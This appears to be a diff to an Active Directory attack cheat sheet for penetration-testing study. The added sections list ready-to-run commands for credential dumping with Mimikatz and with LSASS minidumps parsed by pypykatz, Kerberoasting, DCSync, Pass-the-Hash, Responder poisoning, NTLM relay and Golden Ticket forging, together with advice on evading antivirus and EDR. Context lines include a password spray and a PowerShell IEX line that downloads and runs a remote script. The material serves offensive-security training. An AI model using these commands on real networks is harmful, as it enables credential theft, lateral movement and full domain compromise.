@@ -1,5 +1,70 @@
 # AD Cheat Sheet
 
+Very nice cheatsheet which goes beyond OSCP can be found here too: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
+
+Use Exogol, it contains all the up to date tools mentioned in this papers: https://github.com/ThePorgs/Exegol
+
+## Essentials
+
+note: use pypykatz for offline emulation of mimikatz commands or for invoking mimikatz like commands via python on compromised machine. 
+
+https://github.com/skelsec/pypykatz
+
+Avoid using mimikatz without proper obfuscation as it can be detected by most AVs and EDRs.
+
+```powershell
+
+#PowerView: Retrieves current AD domain details (e.g., name, DCs) for initial recon.
+
+Get-NetDomain
+
+CrackMapExec: cme smb 192.168.1.0/24
+Enumerates SMB hosts in a subnet to identify live systems for targeting.
+
+
+
+Mimikatz: mimikatz.exe "sekurlsa::logonpasswords" exit
+Dumps NTLM hashes and passwords from memory for Pass-the-Hash or Golden Ticket.
+
+
+
+SharpHound: .\SharpHound.exe -c All
+Collects AD data for BloodHound to map attack paths to Domain Admin.
+
+
+
+Rubeus: Rubeus.exe kerberoast /outfile:hashes.txt
+Requests Kerberos service tickets for SPN accounts to crack weak passwords.
+
+
+
+Impacket (secretsdump.py): secretsdump.py <DOMAIN>/<USER>:<PASS>@<DC_IP>
+Performs DCSync to extract krbtgt hash for Golden Ticket creation.
+
+
+
+CrackMapExec: cme smb <TARGET_IP> -u <USER> -H <HASH>
+Uses NTLM hash for Pass-the-Hash to move laterally to target systems.
+
+
+
+Responder: python3 Responder.py -I <INTERFACE>
+Captures NTLM hashes via LLMNR/NBT-NS poisoning for NTLM relay attacks.
+
+
+
+Impacket (ntlmrelayx.py): ntlmrelayx.py -tf targets.txt
+Relays captured NTLM hashes to target systems for privilege escalation.
+
+
+
+Impacket (ticketer.py): ticketer.py -nthash <KRBTGT_HASH> -domain <DOMAIN>
+Creates a Golden Ticket for persistent domain-wide access using the krbtgt hash.
+
+
+```
+
+
 ## Theory
 
 ### AD Structure
@@ -354,7 +419,6 @@ MATCH p=shortestPath((u {highvalue: false})-[*1..]->(g:Group {name: 'DOMAIN ADMI
 ## Exploitation
 
 Try attacking AD in this order:
-Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 * Password Spray
 * Kerberos brute-force
@@ -385,7 +449,7 @@ Source Link: https://www.tarlogic.com/blog/how-to-attack-kerberos/
 
 `kerbrute passwordspray -d corp.com --dc 192.168.239.70 users_spray.txt "Nexus123\!"`
 
-#### Local: LDAP/ADSI
+#### Local
 
 * download script and invoke spray
 
@@ -395,7 +459,9 @@ IEX(New-Object Net.WebClient).downloadString('http://192.168.45.239/DomainPasswo
 
 ```
 
-### Local Host Memmory Dumping
+## Credentials Dumping
+
+### mimikatz
 
 Most of the AD attacks shall require hash or ticket that can be only extracted with SYSTEM rights from the target host.
 
@@ -431,7 +497,24 @@ more options to hide mimikatz
 
 `https://www.crowdstrike.com/blog/credential-theft-mimikatz-techniques/`
 
-### Password misues
+### Pypykatz -> Preferred
+
+This is the preferred method for extracting credentials from the compromised windows host, as it happens offline, apart from dumping the lsass locally.
+
+``` powershell
+procdump.exe -ma lsass.exe C:\Temp\lsass.dmp
+
+
+# Find LSASS PID 
+tasklist | findstr lsass.exe
+#dump lsass
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> C:\Temp\lsass.dmp full
+
+#dump the creds
+pypykatz lsa minidump lsass.dmp
+```
+
+## Password misuse
 
 * if clear text password is obtained start new powershell session
 
